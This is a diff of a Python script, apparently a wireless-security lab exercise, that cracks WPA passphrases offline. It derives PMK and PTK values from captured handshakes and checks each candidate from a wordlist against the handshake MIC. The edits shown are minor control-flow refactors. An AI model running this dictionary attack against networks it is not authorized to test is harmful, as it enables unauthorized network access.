@@ -45,7 +45,7 @@ if __name__ == '__main__':
     ssids, handshakes = get_ssids_and_handshakes(wpa)
 
     for ssid in ssids:
-        if ssid not in handshakes.keys():
+        if ssid not in handshakes:
             break
 
         print("----- Start hacking of {} -----".format(ssid))
@@ -69,7 +69,6 @@ if __name__ == '__main__':
         a = b"Pairwise key expansion"  # this string is used in the pseudo-random function
         b = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(ap_nonce, client_nonce) + max(ap_nonce, client_nonce)
 
-        # Data on which to compute the MIC
         dot11_version = b"\x01"  # 802.1X-2001
         dott11_type = b"\x03"  # key
         message4_len = b"\x00\x5f"  # 95 bytes
@@ -78,6 +77,7 @@ if __name__ == '__main__':
         data = a2b_hex(dot11_version.hex() + dott11_type.hex() + message4_len.hex() + payload.hex())
 
         passphrases_filename = "probable-v2-wpa-top4800.txt"
+        passphrase_found = False
         for passphrase in get_next_line_from_file(passphrases_filename):
             # derives the PMK and then the PTK
             pmk = pbkdf2(hashlib.sha1, str.encode(passphrase), str.encode(ssid), 4096, 32)
@@ -90,7 +90,9 @@ if __name__ == '__main__':
             # as seen with the assistant, the output of hmac here is too large, taking only the first 32 bytes
             mic = hmac.new(kck, data, hashlib.sha1).hexdigest()[0:32]
             if mic == mic_to_test:
+                passphrase_found = True
                 print("The passphrase for \"{}\" is: {}".format(ssid, passphrase))
-                exit()
+                break
 
-        print("The passphrase for \"{}\" was not found in the file.".format(ssid))
+        if not passphrase_found:
+            print("The passphrase for \"{}\" was not found in the file.".format(ssid))
